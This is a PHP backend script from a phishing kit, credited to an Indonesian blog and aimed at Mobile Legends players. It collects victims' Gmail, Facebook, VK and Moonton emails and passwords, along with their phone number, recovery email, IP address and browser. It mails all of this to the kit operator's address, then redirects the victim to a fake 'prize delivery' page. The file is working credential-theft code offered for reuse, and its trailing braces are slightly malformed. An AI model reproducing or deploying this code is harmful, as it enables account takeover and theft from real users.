<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<?php
error_reporting(0);
include('cilepeung.php');

$email = $_POST['email'];
$pass = $_POST['pass'];
$emailfb = $_POST['emailfb'];
$passfb = $_POST['passfb'];
$emailvk = $_POST['emailvk'];
$passvk = $_POST['passvk'];
$emailmn = $_POST['emailmn'];
$passmn = $_POST['passmn'];
$ep = $_POST['ep'];
$hp = $_POST['hp'];
$nick = $_POST['nick'];
$negara = $_POST['negara'];
$skin = $_POST['skin'];
$level = $_POST['level'];

$message   = "

< << Google Account >> >

• Email Gmail : ".$email."
• Password Gmail :  ".$pass."

< << Facebook Account >> >

• Email Facebook :  ".$emailfb."
• Password Facebook : ".$passfb."

< << VK Account >> >

• Email VK : ".$emailvk."
• Password VK : ".$passvk."

< << Moonton Account >> >

• Email Moonton : ".$emailmn."
• Password Moonton : ".$passmn."

< << Detail Account >> >

• Nickname : ".$nick."
• Email Recovery : ".$ep."
• Total Skin : ".$skin."
• Number Phone : ".$hp."
• Country : ".$negara."

< << Info Device >> >

• IP Info   :  ".$alamat."  ".$nama_negro." On ".gmdate('r')."
• Browser   :  ".$_SERVER['HTTP_USER_AGENT']." 

<< ENSIKOLOGY.BLOGSPOT.COM >>

";

include 'email.php';
$subject = "Punya si [ ".$nick." ]";
$headers = "From: Setoran ML  <ensikology@gmail.com>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
'<script>window.location.replace("/pengirimanhadiah.php")</script>';}
}
?>